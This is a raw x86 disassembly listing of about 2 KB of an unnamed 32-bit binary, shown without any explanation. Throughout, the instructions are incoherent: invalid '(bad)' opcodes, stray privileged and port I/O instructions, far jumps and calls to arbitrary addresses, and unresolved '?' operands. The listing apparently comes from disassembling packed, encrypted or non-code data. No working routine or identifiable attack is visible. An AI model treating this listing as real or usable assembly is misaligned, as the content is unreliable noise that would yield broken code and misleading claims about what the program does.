  412f54:	cwde   
  412f55:	loop   0x412fc8
  412f57:	inc    ebx
  412f58:	mov    dh,0x62
  412f5a:	jmp    0x440c:0x4cdc124c
  412f61:	add    bh,BYTE PTR [eax+edi*8-0x6d]
  412f65:	mov    cs,WORD PTR [ebx-0x27958acc]
  412f6b:	and    al,BYTE PTR [esi+0x5ac25527]
  412f71:	or     cl,BYTE PTR [ebx]
  412f73:	gs aam 0x7d
  412f76:	sbb    BYTE PTR [esi+0x796c8eb5],ah
  412f7c:	daa    
  412f7d:	mov    bl,0x9
  412f7f:	std    
  412f80:	sub    ebx,DWORD PTR [ebp+edi*8-0x7e]
  412f84:	jbe    0x412f49
  412f86:	xchg   BYTE PTR [ecx],al
  412f88:	inc    edx
  412f89:	and    BYTE PTR [edi+0x45f6c062],ah
  412f8f:	out    0x9c,al
  412f91:	inc    esi
  412f92:	mov    ah,0x67
  412f94:	shl    DWORD PTR [edx+0xebc188d],cl
  412f9a:	mov    ebx,0x5a49854b
  412f9f:	fadd   DWORD PTR [edi-0x27]
  412fa2:	call   0x20f91e28
  412fa7:	lahf   
  412fa8:	cmp    al,0x5a
  412faa:	sub    ebx,ebx
  412fac:	loope  0x412f95
  412fae:	les    ebp,FWORD PTR ss:[edi]
  412fb1:	clc    
  412fb2:	add    BYTE PTR [ebp+0x6d4bdf8f],0x55
  412fb9:	xlat   BYTE PTR ds:[ebx]
  412fba:	test   al,0xeb
  412fbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fbd:	add    al,0xc7
  412fbf:	pop    es
  412fc0:	pop    ebp
  412fc1:	push   ebx
  412fc2:	(bad)  
  412fc3:	xor    dh,BYTE PTR [eax-0x29]
  412fc6:	popa   
  412fc7:	fcom   DWORD PTR [ebp+0x31]
  412fca:	cdq    
  412fcb:	pop    eax
  412fcc:	adc    BYTE PTR [ebx-0x725f7549],al
  412fd2:	pop    esp
  412fd3:	jge    0x412fa0
  412fd5:	pop    edi
  412fd6:	lock jae 0x412fba
  412fd9:	mov    eax,ds:0x46e26d2e
  412fde:	adc    eax,0x7ab0f2e5
  412fe3:	cwde   
  412fe4:	aad    0xa0
  412fe6:	inc    ebp
  412fe7:	(bad)  
  412fe8:	xchg   edx,eax
  412fe9:	jnp    0x412fee
  412feb:	mov    BYTE PTR [ecx-0x3a],ch
  412fee:	or     ah,BYTE PTR [ecx+0x2]
  412ff1:	lea    ebx,ds:0x101af14
  412ff7:	fisub  DWORD PTR [eax+0x7f]
  412ffa:	mov    bh,0x0
  412ffc:	loopne 0x412f9b
  412ffe:	test   al,0xfc
  413000:	loope  0x412fe5
  413002:	push   cs
  413003:	lahf   
  413004:	pop    esi
  413005:	sub    eax,0xc2d60024
  41300a:	fild   WORD PTR [esi+0x1a]
  41300d:	fwait
  41300e:	mov    ds:0xfa8b13b5,al
  413013:	or     ah,cl
  413015:	ja     0x413067
  413017:	inc    edx
  413018:	or     al,0xee
  41301a:	pop    edx
  41301b:	cwde   
  41301c:	and    bh,0xc3
  41301f:	popa   
  413020:	dec    ebx
  413021:	test   DWORD PTR [esi+0x25],0x2ae20af
  413028:	rdpmc  
  41302a:	jo     0x412fd2
  41302c:	push   ebx
  41302d:	lea    ebx,[edx-0x3f]
  413030:	mov    ebp,0xadb73d19
  413035:	iret   
  413036:	bound  ebp,QWORD PTR [ebp+0xc]
  413039:	and    al,0x68
  41303b:	inc    edx
  41303c:	dec    ebp
  41303d:	mov    eax,ds:0xe7d1945b
  413042:	jp     0x41308c
  413044:	in     al,dx
  413045:	inc    esi
  413046:	mov    edx,DWORD PTR [eax]
  413048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413049:	inc    esp
  41304a:	pop    eax
  41304b:	adc    edi,eax
  41304d:	xor    eax,0x1ed5b39c
  413052:	ins    BYTE PTR es:[edi],dx
  413053:	mov    cl,0x1a
  413055:	mov    bh,0x20
  413057:	sub    DWORD PTR [eax-0x2],ebp
  41305a:	mov    WORD PTR [edi-0x7dda4291],ss
  413060:	sbb    DWORD PTR [esi+esi*4],ebp
  413063:	repz jae 0x4130a0
  413066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413067:	(bad)  
  413068:	ss aam 0xff
  41306b:	pushf  
  41306c:	dec    esi
  41306d:	mov    esp,0xd3f5bd33
  413072:	imul   eax,eax,0x52
  413075:	out    dx,al
  413076:	call   0xd5f3e916
  41307b:	mov    al,0x4
  41307d:	sub    DWORD PTR [edx],ecx
  41307f:	jge    0x4130d1
  413081:	int3   
  413082:	inc    eax
  413083:	xor    bl,BYTE PTR [ebx-0x19]
  413086:	sub    DWORD PTR [edi],ebp
  413088:	loopne 0x41305d
  41308a:	lods   al,BYTE PTR ds:[esi]
  41308b:	xor    BYTE PTR [eax-0x62911b62],0x81
  413092:	aas    
  413093:	shr    BYTE PTR [ebx+0x4d205e10],1
  413099:	inc    esp
  41309a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309b:	and    dl,cl
  41309d:	scas   al,BYTE PTR es:[di]
  41309f:	xlat   BYTE PTR ds:[ebx]
  4130a0:	push   0x48
  4130a2:	retf   0x6df4
  4130a5:	jo     0x41304f
  4130a7:	scas   al,BYTE PTR es:[edi]
  4130a8:	aas    
  4130a9:	ss jmp 0x413074
  4130ac:	addr16 push esi
  4130ae:	jb     0x413064
  4130b0:	jecxz  0x4130fd
  4130b2:	outs   dx,BYTE PTR ds:[esi]
  4130b3:	add    DWORD PTR [edi+0x453b987c],0x1efdb2b7
  4130bd:	in     al,dx
  4130be:	mov    ecx,0xe928f51b
  4130c3:	repnz scas eax,DWORD PTR es:[edi]
  4130c5:	jbe    0x4130b0
  4130c7:	mov    esi,0x516f5c76
  4130cc:	push   0x1021de8c
  4130d1:	add    BYTE PTR [ebx],bh
  4130d3:	int3   
  4130d4:	lds    ebx,FWORD PTR [ecx]
  4130d6:	pop    ecx
  4130d7:	ja     0x41310e
  4130d9:	shr    DWORD PTR [ebx-0x4e8bc14a],0x40
  4130e0:	arpl   WORD PTR [eax-0x1a],bx
  4130e3:	out    0x6b,al
  4130e5:	rol    BYTE PTR [edi+0x72],1
  4130e8:	popf   
  4130e9:	mov    ah,0xe3
  4130eb:	mov    DWORD PTR [eax],ebx
  4130ed:	inc    eax
  4130ee:	push   edi
  4130ef:	mov    ebp,0x6193dbb2
  4130f4:	dec    edi
  4130f5:	push   edx
  4130f6:	or     cl,BYTE PTR [esi+ecx*2-0x1c1b90cf]
  4130fd:	sbb    ebp,DWORD PTR [ebp+0x32e44339]
  413103:	mov    ebp,0x1c748a9d
  413108:	pop    ebx
  413109:	inc    ecx
  41310a:	pop    edx
  41310b:	stos   DWORD PTR es:[edi],eax
  41310c:	pop    esi
  41310d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41310e:	inc    ebp
  41310f:	fld    TBYTE PTR cs:[eax]
  413112:	dec    edi
  413113:	mov    ch,0xdc
  413115:	sbb    ch,BYTE PTR [edx+0x1c9bb569]
  41311b:	cmp    DWORD PTR [ebp-0x7d357a8c],0x3119e2ea
  413125:	lock and eax,0xaa0b3316
  41312c:	inc    edi
  41312d:	mov    ebp,0x69b102cd
  413132:	ins    DWORD PTR es:[edi],dx
  413133:	adc    DWORD PTR [ecx],edi
  413135:	int    0x8f
  413137:	(bad)  
  413138:	repnz or edx,eax
  41313b:	test   BYTE PTR [ebp-0x13fcdcd6],dl
  413141:	or     edi,DWORD PTR ds:0xb332813c
  413147:	cmp    al,0xac
  413149:	push   0x5d13bb4c
  41314e:	arpl   di,dx
  413150:	arpl   WORD PTR [ebx-0x15],bx
  413153:	fmul   DWORD PTR [ebx+eax*8]
  413156:	mov    edx,0x5d616368
  41315b:	xchg   ebp,eax
  41315c:	mov    ds,WORD PTR [ebp-0x11a989c9]
  413162:	shl    BYTE PTR [ecx+0x878274c],1
  413168:	and    DWORD PTR [edx],0xffffffec
  41316b:	push   eax
  41316c:	sbb    ah,BYTE PTR [ebx]
  41316e:	mov    esp,ecx
  413170:	sub    edx,ecx
  413172:	fld    QWORD PTR [esi+ebx*4+0x7d]
  413176:	mov    bh,0xd5
  413178:	sub    BYTE PTR [ebp-0x14],dh
  41317b:	in     eax,0xe
  41317d:	mov    dl,0x62
  41317f:	xor    DWORD PTR [edx-0x7b003d73],eax
  413185:	inc    edi
  413186:	loop   0x413171
  413188:	adc    DWORD PTR [ebx-0x46e7e921],edi
  41318e:	add    bl,BYTE PTR [ecx+0x2d]
  413191:	pop    esi
  413192:	xchg   BYTE PTR [esi-0x3a],ch
  413195:	add    BYTE PTR [ecx-0xdc2e824],bl
  41319b:	aaa    
  41319c:	ffreep st(1)
  41319e:	dec    edx
  41319f:	sbb    eax,DWORD PTR [ebp+0x5621d3a7]
  4131a5:	inc    edx
  4131a6:	in     eax,dx
  4131a7:	fwait
  4131a8:	push   cs
  4131a9:	(bad)  
  4131aa:	ds and eax,0x93421c44
  4131b0:	push   ecx
  4131b1:	dec    eax
  4131b2:	lock sbb BYTE PTR [eax-0x6d],dh
  4131b6:	movups xmm0,XMMWORD PTR [edi+0x6c]
  4131ba:	out    0x70,al
  4131bc:	(bad)  
  4131bd:	sahf   
  4131be:	out    0x7d,eax
  4131c0:	pop    ebp
  4131c1:	xor    dl,BYTE PTR [eax-0x37a1f536]
  4131c7:	shl    BYTE PTR [ebx+0x1d],cl
  4131ca:	inc    esp
  4131cb:	imul   eax,esp,0x26361029
  4131d1:	mov    edx,0x3519a07a
  4131d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131d7:	xchg   edi,eax
  4131d8:	push   esp
  4131d9:	(bad)  
  4131da:	das    
  4131db:	dec    esp
  4131dc:	aaa    
  4131dd:	dec    esp
  4131de:	pop    ebp
  4131df:	lods   al,BYTE PTR ds:[esi]
  4131e0:	pusha  
  4131e1:	bnd ja 0x4131ec
  4131e4:	sbb    edx,edi
  4131e6:	cmp    eax,DWORD PTR [eax-0x3c]
  4131e9:	mov    dh,0x9a
  4131eb:	mov    DWORD PTR [esi],ebx
  4131ed:	dec    esp
  4131ee:	cmp    dh,BYTE PTR [ecx+0x5]
  4131f1:	das    
  4131f2:	icebp  
  4131f3:	fcomp  DWORD PTR [edx+0x555ba9d1]
  4131f9:	add    DWORD PTR [esi-0x5a1c9ac2],edx
  4131ff:	in     al,0x9
  413201:	and    ebx,DWORD PTR [esi+0xf196fc3]
  413207:	inc    ebx
  413208:	fstp   TBYTE PTR [ebx+0x1d]
  41320b:	pop    ebp
  41320c:	fst    DWORD PTR [esi]
  41320e:	and    al,0xfe
  413210:	sub    bh,ah
  413212:	mov    bl,0xc6
  413214:	dec    edi
  413215:	xor    al,0xde
  413217:	pop    es
  413218:	int    0xee
  41321a:	and    al,0x18
  41321c:	sar    ch,cl
  41321e:	lock sub ecx,edx
  413221:	inc    edx
  413222:	xor    al,0xd4
  413224:	push   ds
  413225:	lea    ebp,[eax-0x246baa1b]
  41322b:	jmp    0x8416fb69
  413230:	jecxz  0x4132b0
  413232:	out    0xc5,al
  413234:	xchg   edi,eax
  413235:	sub    ebp,DWORD PTR [ecx-0x6a]
  413238:	lods   al,BYTE PTR ds:[esi]
  413239:	lods   al,BYTE PTR ds:[esi]
  41323a:	xor    al,0x24
  41323c:	xchg   ecx,eax
  41323d:	xor    DWORD PTR [edi+0x391c73de],ebp
  413243:	lds    eax,FWORD PTR [ebp-0x12]
  413246:	sti    
  413247:	out    0x60,al
  413249:	shl    ch,1
  41324b:	retf   0xaad1
  41324e:	mov    fs,WORD PTR [eax+0x0]
  413251:	pop    ebp
  413252:	es mov bl,0x3b
  413255:	sahf   
  413256:	iret   
  413257:	or     BYTE PTR [esi+0x1e706f4c],bl
  41325d:	pop    ebx
  41325e:	jb     0x413219
  413260:	inc    edx
  413261:	mov    ebp,0x935cd965
  413266:	dec    esi
  413267:	pushf  
  413268:	mov    ds,edx
  41326a:	mov    BYTE PTR [eax],dh
  41326c:	push   es
  41326d:	push   ebx
  41326e:	inc    edx
  41326f:	fnsave [ecx-0x68]
  413272:	sub    esp,ebp
  413274:	pusha  
  413275:	(bad)  
  413276:	jg     0x413211
  413278:	sbb    ch,BYTE PTR [eax-0x5f]
  41327b:	ins    BYTE PTR es:[edi],dx
  41327c:	mov    al,ds:0x9c13ec74
  413281:	sbb    BYTE PTR ss:[ecx],dh
  413284:	test   DWORD PTR [ebx+0x242e4a16],ebx
  41328a:	add    edi,DWORD PTR [eax]
  41328c:	scas   eax,DWORD PTR es:[edi]
  41328d:	ja     0x41324e
  41328f:	dec    ecx
  413290:	dec    ecx
  413291:	sbb    esi,ebp
  413293:	icebp  
  413294:	xchg   esp,eax
  413295:	iret   
  413296:	jg     0x41329c
  413298:	pop    ds
  413299:	dec    edx
  41329a:	das    
  41329b:	mov    cl,0xba
  41329d:	pop    eax
  41329e:	jmp    0x413256
  4132a0:	push   ebx
  4132a1:	in     al,dx
  4132a2:	mov    WORD PTR [eax-0x5],?
  4132a5:	jb     0x41326b
  4132a7:	repz mov ah,ah
  4132aa:	lods   al,BYTE PTR ds:[esi]
  4132ab:	dec    ebp
  4132ac:	in     al,0xac
  4132ae:	popa   
  4132af:	jbe    0x413250
  4132b1:	in     al,0x26
  4132b3:	addr16 push esi
  4132b5:	push   0x55ebd6d9
  4132ba:	inc    eax
  4132bb:	int    0x4c
  4132bd:	mov    ds:0xb56a22e,al
  4132c2:	sbb    al,0x3
  4132c4:	(bad)  
  4132c5:	or     ebx,ebp
  4132c7:	arpl   WORD PTR [edi+0x4a],cx
  4132ca:	cwde   
  4132cb:	sub    BYTE PTR [ebx+0x78],0xc
  4132cf:	gs scas al,BYTE PTR es:[edi]
  4132d1:	push   0xc5ff1046
  4132d6:	adc    edx,esp
  4132d8:	xchg   DWORD PTR [ebx-0x10],esi
  4132db:	and    BYTE PTR [edi-0x2f98d615],dl
  4132e1:	daa    
  4132e2:	jo     0x41329a
  4132e4:	scas   al,BYTE PTR es:[edi]
  4132e5:	lods   al,BYTE PTR ds:[esi]
  4132e6:	fist   WORD PTR [ebx+0x68]
  4132e9:	pop    esi
  4132ea:	je     0x4132d8
  4132ec:	addr16 add al,0xcd
  4132ef:	xchg   ebx,eax
  4132f0:	or     eax,0x1acbc709
  4132f5:	push   ebp
  4132f6:	loop   0x4132f5
  4132f8:	stc    
  4132f9:	lods   al,BYTE PTR ds:[esi]
  4132fa:	loope  0x4132de
  4132fc:	out    dx,eax
  4132fd:	jg     0x4132ed
  4132ff:	inc    edx
  413300:	ins    BYTE PTR es:[edi],dx
  413301:	mov    edi,0x71b0c3bc
  413306:	mov    dl,0x8
  413308:	int3   
  413309:	sub    ah,dh
  41330b:	mov    ah,0x9
  41330d:	call   0x7e62c458
  413312:	mov    ecx,0x6c79fcdb
  413317:	aaa    
  413318:	loopne 0x4132f6
  41331a:	push   0xffffffc8
  41331c:	inc    esi
  41331d:	push   ebp
  41331e:	mov    al,ds:0xdb5d72c5
  413323:	sar    BYTE PTR [edx],1
  413325:	fisttp QWORD PTR [esi-0x48]
  413328:	mov    eax,0xbee45f99
  41332d:	aam    0xb0
  41332f:	cmp    eax,0x5be7a6b3
  413334:	pushaw 
  413336:	test   BYTE PTR [edx-0x21],dh
  413339:	imul   DWORD PTR [esi+0x29]
  41333c:	jmp    0xd49c:0xa16572a6
  413343:	fdivp  st(1),st
  413345:	xchg   edi,eax
  413346:	push   edi
  413347:	int    0xd2
  413349:	es cmp al,0xa6
  41334c:	repz pop esi
  41334e:	and    eax,0x3d945e56
  413353:	popa   
  413354:	nop
  413355:	xchg   edi,eax
  413356:	out    0x9f,al
  413358:	test   DWORD PTR [edi],ebp
  41335a:	mov    cl,0xaa
  41335c:	jbe    0x413394
  41335e:	sahf   
  41335f:	(bad)  
  413360:	mov    esi,0x437fccb0
  413365:	or     esi,DWORD PTR ds:0xbb4449d7
  41336b:	scas   eax,DWORD PTR es:[edi]
  41336c:	fcomp  QWORD PTR [edi]
  41336e:	push   es
  41336f:	ins    BYTE PTR es:[edi],dx
  413370:	ins    DWORD PTR es:[edi],dx
  413371:	cmp    DWORD PTR [eax-0x12],esp
  413374:	stos   BYTE PTR es:[edi],al
  413375:	pop    esp
  413376:	adc    esi,DWORD PTR [esi+eiz*8+0x57d4f2ad]
  41337d:	xchg   bx,ax
  41337f:	mov    BYTE PTR [edi+0x2dcde9f3],dl
  413385:	pop    edx
  413386:	xchg   ebx,eax
  413387:	cmp    BYTE PTR [edi-0x54b3fed5],bl
  41338d:	push   edi
  41338e:	popf   
  41338f:	and    esi,ebp
  413391:	pop    edx
  413392:	das    
  413393:	jl     0x41333b
  413395:	retf   
  413396:	jno    0x413374
  413398:	fisubr DWORD PTR [edx]
  41339a:	xchg   esi,eax
  41339b:	stos   BYTE PTR es:[edi],al
  41339c:	or     bl,dl
  41339e:	jp     0x413360
  4133a0:	popa   
  4133a1:	fbstp  TBYTE PTR [ebx-0x65daeb28]
  4133a7:	push   cs
  4133a8:	jecxz  0x41341d
  4133aa:	sahf   
  4133ab:	mov    bl,0x60
  4133ad:	data16 sub bl,BYTE PTR [eax+ebx*2+0x65]
  4133b2:	mov    WORD PTR [eax+0x1d8a84fc],gs
  4133b8:	in     al,0x5a
  4133ba:	or     al,0x89
  4133bc:	(bad)  
  4133bd:	hlt    
  4133be:	into   
  4133bf:	out    0x91,eax
  4133c1:	call   0xe441ce55
  4133c6:	add    BYTE PTR [eax+esi*8+0x22],cl
  4133ca:	mov    ebx,?
  4133cc:	aas    
  4133cd:	rol    ebx,1
  4133cf:	xor    al,dl
  4133d1:	jbe    0x413361
  4133d3:	loopne 0x41335b
  4133d5:	cdq    
  4133d6:	or     dl,BYTE PTR [esi]
  4133d8:	and    al,0x13
  4133da:	push   0xffffff8f
  4133dc:	xchg   ecx,eax
  4133dd:	cmp    DWORD PTR [ecx],eax
  4133df:	xchg   edi,eax
  4133e0:	cld    
  4133e1:	mov    ah,dh
  4133e3:	fwait
  4133e4:	xchg   cl,al
  4133e6:	jecxz  0x413444
  4133e8:	push   esi
  4133e9:	je     0x413443
  4133eb:	cmc    
  4133ec:	push   es
  4133ed:	out    0xd,al
  4133ef:	fidivr DWORD PTR [ebx]
  4133f1:	inc    eax
  4133f2:	add    BYTE PTR [ebp+ebp*1+0x17],ah
  4133f6:	lahf   
  4133f7:	mov    eax,0x9896761b
  4133fc:	fimul  DWORD PTR [edi+0x5d]
  4133ff:	adc    al,BYTE PTR [eax]
  413401:	cmp    al,0xcf
  413403:	dec    esp
  413404:	inc    edi
  413405:	dec    ecx
  413406:	cmp    edi,DWORD PTR [edi]
  413408:	pop    ds
  413409:	and    dh,bl
  41340b:	jb     0x4133c0
  41340d:	fsubr  DWORD PTR [eax-0x7a9749a8]
  413413:	stc    
  413414:	ja     0x41341c
  413416:	sub    al,BYTE PTR [ebp+esi*8+0x3e]
  41341a:	sar    ebx,0x5e
  41341d:	outs   dx,DWORD PTR ds:[esi]
  41341e:	je     0x4133ec
  413420:	gs jp  0x413417
  413423:	test   DWORD PTR [ebx-0x2f],ebp
  413426:	pop    esi
  413427:	xor    bh,al
  413429:	test   DWORD PTR [eax+0x32f93d7c],ecx
  41342f:	mov    dl,0x83
  413431:	mov    ecx,0x5ac760dd
  413436:	mov    al,ds:0x266530e3
  41343b:	xchg   ebx,eax
  41343c:	mov    eax,ds:0x47bdd89c
  413441:	mov    ecx,0x638d3c50
  413446:	and    DWORD PTR [edi],ebx
  413448:	jmp    0xef2c0397
  41344d:	js     0x413469
  41344f:	mov    edx,0x3c8377a8
  413454:	dec    ebx
  413455:	push   cs
  413456:	push   eax
  413457:	push   cs
  413458:	int    0xd9
  41345a:	sbb    dl,BYTE PTR [edx+0x7c9b3fab]
  413460:	jmp    0xfd5679f4
  413465:	cmp    ecx,DWORD PTR [edx]
  413467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413468:	dec    ebp
  413469:	stos   DWORD PTR es:[edi],eax
  41346a:	icebp  
  41346b:	ror    eax,0xfc
  41346e:	scas   eax,DWORD PTR es:[edi]
  41346f:	push   esi
  413470:	mov    ch,0x12
  413472:	jne    0x4134cc
  413474:	dec    esp
  413475:	add    DWORD PTR [ebx+0x59],esi
  413478:	pop    ss
  413479:	in     al,dx
  41347a:	add    BYTE PTR [esi],cl
  41347c:	dec    ebx
  41347d:	imul   ecx,DWORD PTR [ebp+0x141cabd5],0x51
  413484:	into   
  413485:	int    0x8b
  413487:	addr16 je 0x413468
  41348a:	aad    0x57
  41348c:	pushf  
  41348d:	mov    dl,0x37
  41348f:	inc    eax
  413490:	jae    0x4134b2
  413492:	retf   
  413493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413494:	enter  0x6a53,0x17
  413498:	scas   eax,DWORD PTR es:[edi]
  413499:	repnz add cl,al
  41349c:	stos   BYTE PTR es:[edi],al
  41349d:	repz jecxz 0x4134b4
  4134a0:	(bad)  
  4134a1:	or     al,0x79
  4134a3:	pop    eax
  4134a4:	mov    edx,0xa1802856
  4134a9:	sbb    eax,0x21d2641
  4134ae:	sbb    dh,BYTE PTR [esi+eiz*2+0x24a04fb9]
  4134b5:	adc    al,0x4c
  4134b7:	aas    
  4134b8:	xchg   edx,eax
  4134b9:	(bad)  [ecx-0x65]
  4134bc:	xchg   BYTE PTR [edi-0x49],dl
  4134bf:	jo     0x413493
  4134c1:	or     al,0x9f
  4134c3:	js     0x413482
  4134c5:	xor    edx,DWORD PTR [edx-0x687491f0]
  4134cb:	sbb    cl,BYTE PTR [esi+0x58]
  4134ce:	aam    0x9c
  4134d0:	fwait
  4134d1:	shr    DWORD PTR [edx-0x5a],cl
  4134d4:	pop    ebx
  4134d5:	jge    0x413543
  4134d7:	popf   
  4134d8:	popf   
  4134d9:	cmp    BYTE PTR [esi-0x64],bh
  4134dc:	faddp  st(1),st
  4134de:	stos   DWORD PTR es:[edi],eax
  4134df:	or     edi,edi
  4134e1:	adc    DWORD PTR [eax+edx*4-0x4d],ebx
  4134e5:	jns    0x41354e
  4134e7:	mov    al,0x44
  4134e9:	xor    BYTE PTR [ebx+eiz*8],0x84
  4134ed:	in     al,dx
  4134ee:	scas   eax,DWORD PTR es:[edi]
  4134ef:	aaa    
  4134f0:	or     ecx,DWORD PTR [edi]
  4134f2:	add    eax,0x893bcf8
  4134f7:	xlat   BYTE PTR ds:[ebx]
  4134f8:	mov    ds,WORD PTR [edi]
  4134fa:	mov    ds:0xca7c063,eax
  4134ff:	fwait
  413500:	jmp    0x413485
  413502:	add    edi,DWORD PTR [edi]
  413504:	retf   0xd513
  413507:	(bad)  
  413508:	(bad)  
  413509:	loopne 0x41350b
  41350b:	push   0xce393739
  413510:	mov    al,ds:0xa9e266e6
  413515:	shl    DWORD PTR [edx+0x3b],cl
  413518:	ret    
  413519:	cdq    
  41351a:	aas    
  41351b:	fs (bad) 
  41351d:	mov    edi,0x2acb483d
  413523:	mov    ebp,0xd95ffcc0
  413528:	lds    ebx,FWORD PTR [ecx-0x67]
  41352b:	or     al,0x86
  41352d:	int    0x2e
  41352f:	ja     0x413548
  413531:	xor    ah,ch
  413533:	(bad)
  413536:	mov    esi,0x8fa87dae
  41353b:	xor    ecx,0xf4e0480a
  413541:	mov    dh,0xb6
  413543:	mov    ds:0xcdf54862,al
  413548:	lds    ebx,FWORD PTR [edi-0x6f5d7e72]
  41354e:	jo     0x4135b4
  413550:	outs   dx,BYTE PTR ds:[esi]
  413551:	xor    al,0xc6
  413553:	add    eax,0xfff91231
  413558:	aam    0x23
  41355a:	xchg   DWORD PTR [eax-0x6b],ecx
  41355d:	inc    eax
  41355e:	inc    eax
  41355f:	int3   
  413560:	shld   esp,eax,cl
  413563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413564:	outs   dx,DWORD PTR ds:[esi]
  413565:	inc    cl
  413567:	out    0x92,eax
  413569:	int    0x9c
  41356b:	pop    esi
  41356c:	push   cs
  41356d:	sahf   
  41356e:	mov    dl,0x4
  413570:	inc    esi
  413571:	ret    0x8e9d
  413574:	loopne 0x413503
  413576:	(bad)  
  413577:	push   cs
  413578:	in     al,0xa3
  41357a:	xlat   BYTE PTR ds:[ebx]
  41357b:	or     bh,BYTE PTR ds:0xa08c3bb8
  413581:	sar    DWORD PTR [ecx],0xeb
  413584:	push   ds
  413585:	(bad)  
  413586:	cmp    al,0x32
  413588:	fidivr DWORD PTR ds:0x5d54d749
  41358e:	push   edi
  41358f:	xchg   ebp,eax
  413590:	(bad)  
  413591:	cwde   
  413592:	mov    dl,cl
  413594:	inc    ecx
  413595:	sub    BYTE PTR [edi+ecx*2-0x46],bh
  413599:	xchg   edx,eax
  41359a:	xchg   ecx,eax
  41359b:	sbb    dh,BYTE PTR [ebx-0x778f8684]
  4135a1:	cmp    dl,BYTE PTR [ecx]
  4135a3:	imul   esi,DWORD PTR [ebp+0x32],0x5
  4135a7:	das    
  4135a8:	call   0x6f3a1141
  4135ad:	push   edx
  4135ae:	adc    ch,BYTE PTR [esi+edi*2]
  4135b1:	or     eax,0x5b370587
  4135b6:	mov    cl,BYTE PTR [eax-0x1abc5468]
  4135bc:	test   DWORD PTR [edx],esp
  4135be:	jne    0x41359b
  4135c0:	xor    eax,0xb9d76999
  4135c5:	addr16 push 0x79e311d2
  4135cb:	push   ebx
  4135cc:	sbb    ch,ch
  4135ce:	outs   dx,BYTE PTR ds:[esi]
  4135cf:	mov    ebp,0xcf00faa0
  4135d4:	mov    dl,al
  4135d6:	and    edi,DWORD PTR [edx]
  4135d8:	mov    esi,0xb1183d8d
  4135dd:	mov    bh,al
  4135df:	mov    edx,0x226295f8
  4135e4:	mov    ebp,0x5e3bf0e1
  4135e9:	out    0xa5,al
  4135eb:	fimul  DWORD PTR [eax-0x49dd13b6]
  4135f1:	xchg   ebx,eax
  4135f2:	rcr    DWORD PTR [esi+0x14],cl
  4135f5:	aas    
  4135f6:	addr16 pop esp
  4135f8:	and    eax,0x8839b81
  4135fd:	fisub  WORD PTR [eax-0x110eb2b7]
  413603:	dec    ecx
  413604:	add    BYTE PTR [esi-0x45],0x30
  413608:	mov    esp,0x6c014352
  41360d:	loop   0x41364c
  41360f:	cmp    cl,BYTE PTR [ebx+eax*1]
  413612:	push   esi
  413613:	mov    ds:0xd284ef74,al
  413618:	push   0xffffffdf
  41361a:	rcl    DWORD PTR [esi-0x197c47cc],1
  413620:	(bad)  
  413621:	or     dh,BYTE PTR [ecx+0x69c373d4]
  413627:	pop    ecx
  413628:	dec    ebp
  413629:	cmp    eax,0x7e5f51ee
  41362e:	sub    BYTE PTR [eax],dh
  413630:	std    
  413631:	retf   0x6f5c
  413634:	mov    al,cs:0x4fd99f17
  41363a:	mov    ah,BYTE PTR [ebp-0x93eea8e]
  413640:	mov    bh,0xda
  413642:	pop    ss
  413643:	aam    0xf9
  413645:	mov    al,0xf2
  413647:	fnstenv [edx+ebp*4-0x43e94bb4]
  41364e:	mov    ah,BYTE PTR [esi-0x8d7d6e8]
  413654:	ret    
  413655:	loop   0x4136c9
  413657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413658:	cmpxchg BYTE PTR [esp+edx*1-0x5f45bc29],dh
  413660:	push   0xffffffc7
  413662:	add    BYTE PTR [esi],dl
  413664:	jmp    0xaf89d28a
  413669:	and    esp,DWORD PTR [edi-0x31]
  41366c:	daa    
  41366d:	outs   dx,DWORD PTR ds:[esi]
  41366e:	xor    eax,0xd1347b98
  413673:	xor    bh,cl
  413675:	enter  0x29f3,0xa8
  413679:	mov    ds:0xc9922106,al
  41367e:	bound  eax,QWORD PTR [edx]
  413680:	(bad)  
  413681:	in     al,0xd7
  413683:	mov    esp,0x766bda32
  413688:	es loop 0x4136a3
  41368b:	xchg   esi,eax
  41368c:	pop    esp
  41368d:	mov    bh,0xa7
  41368f:	lods   al,BYTE PTR ds:[esi]
  413690:	push   DWORD PTR [esi]
  413692:	adc    DWORD PTR [ebx-0x41da4f10],esi
  413698:	fwait
  413699:	jno    0x413661
  41369b:	pop    ebx
  41369c:	cmp    al,0x65
  41369e:	test   dl,cl
  4136a0:	imul   esp,DWORD PTR [edi+eax*1],0x4d081d98
  4136a7:	shl    DWORD PTR ds:[edi-0x5e],0x54
  4136ac:	push   ss
  4136ad:	sub    al,BYTE PTR [edi]
  4136af:	pop    ss
  4136b0:	mov    ah,0xfd
  4136b2:	push   ss
  4136b3:	imul   esp,DWORD PTR [edx+ebp*8],0x44
  4136b7:	or     al,0x6f
  4136b9:	std    
  4136ba:	inc    ecx
  4136bb:	mov    al,0x44
  4136bd:	or     eax,0xd835134f
  4136c2:	cs fcmovnb st,st(4)
  4136c5:	mov    ebx,0x275cd66a
  4136ca:	cli    
  4136cb:	enter  0x503a,0xb6
  4136cf:	xchg   ecx,eax
  4136d0:	and    eax,0x1b899268
  4136d6:	push   esi
  4136d7:	test   dh,ch
  4136d9:	jg     0x41370d
  4136db:	pop    edx
  4136dc:	jbe    0x41372e
  4136de:	push   DWORD PTR [edx+0x45cc5051]
  4136e4:	sbb    eax,0x6f563a82
  4136e9:	mov    ecx,0x2e68c232
  4136ee:	jae    0x4136ee
  4136f0:	mov    edi,0xee4f50c1
  4136f5:	loope  0x413761
  4136f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136f8:	call   DWORD PTR [esi]
  4136fa:	push   ss
  4136fb:	mov    ch,0x9e
  4136fd:	add    eax,DWORD PTR ds:0x33989b9a
  413703:	pop    ecx
  413704:	sar    BYTE PTR [edx],0x1
  413707:	mov    cl,0x3e
  413709:	ret    0xc49c
  41370c:	cwde   
  41370d:	mov    ebp,0x5b5a50ba
  413712:	xchg   esi,eax
  413713:	dec    ecx
